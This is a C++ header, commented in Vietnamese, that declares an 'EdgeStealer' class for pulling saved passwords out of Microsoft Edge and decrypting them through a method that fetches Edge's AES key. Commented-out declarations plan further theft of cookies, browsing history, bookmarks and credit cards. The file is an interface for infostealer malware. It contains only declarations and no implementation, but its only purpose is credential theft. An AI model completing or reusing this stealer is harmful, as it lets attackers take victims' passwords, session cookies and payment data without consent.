#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <tuple>


class EdgeStealer {
public:
    EdgeStealer();
    ~EdgeStealer();

    // Trích xuất password đã lưu (đã giải mã)
    std::vector<std::tuple<std::string, std::string, std::string, std::string>> StealPasswords();


    // hazz optional k biết có nen triển khai k 
    // 
    //// Trích xuất cookies (đã giải mã)
    //std::vector<std::tuple<std::string, std::string, std::string>> StealCookies();

    //// Trích xuất history
    //std::vector<std::tuple<std::string, std::string, long long>> StealHistory();

    //// Trích xuất bookmark
    //std::vector<std::tuple<std::string, std::string>> StealBookmarks();

    //// Trích xuất credit card (nếu có)
    //std::vector<std::tuple<std::string, std::string, std::string>> StealCreditCards();

private:
    std::string GetEdgeAESKey();
  
};